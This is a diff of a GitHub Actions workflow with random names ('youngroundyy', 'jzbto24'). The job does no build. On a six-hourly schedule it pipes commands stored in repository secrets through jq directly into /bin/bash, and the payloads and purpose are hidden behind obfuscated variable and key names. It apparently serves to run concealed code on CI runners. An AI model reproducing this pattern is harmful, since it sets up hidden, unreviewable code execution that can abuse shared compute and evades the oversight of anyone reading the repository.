@@ -1,8 +1,10 @@
 name: youngroundyy
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '9 4/6 * * *'
+    - cron: '35 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,15 +13,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: youngroundyy
         env:
-          q5: ${{ secrets.q5 }}
+          jzbto24: ${{ secrets.jzbto24 }}
         run: |
-          echo $q5 | jq -r .ix50042 | /bin/bash
-          echo $uu9 | jq -r .kp73 | /bin/bash
-          echo $v82555 | jq -r .dthch75256 | /bin/bash
-          echo $ho0 | jq -r .vjgi3 | /bin/bash
-          echo $euo4475 | jq -r .fpg49952 | /bin/bash
-          echo $yittm84 | jq -r .fxtxv5290 | /bin/bash
-          echo $y8 | jq -r .hb3425 | /bin/bash
-          echo $agyw8871 | jq -r .owqfz3310 | /bin/bash
-          echo $e15470 | jq -r .evsp4352 | /bin/bash
+          echo $jzbto24 | jq -r .luuko37989 | /bin/bash
+          echo $jgom43 | jq -r .subky4 | /bin/bash
+          echo $pmxbu6946 | jq -r .ue40337 | /bin/bash
+          echo $qqodc3911 | jq -r .iph1 | /bin/bash
+          echo $kcoxj89978 | jq -r .wru7 | /bin/bash
+          echo $u23452 | jq -r .exhv0 | /bin/bash
+          echo $zn03790 | jq -r .fdxtp3514 | /bin/bash
 
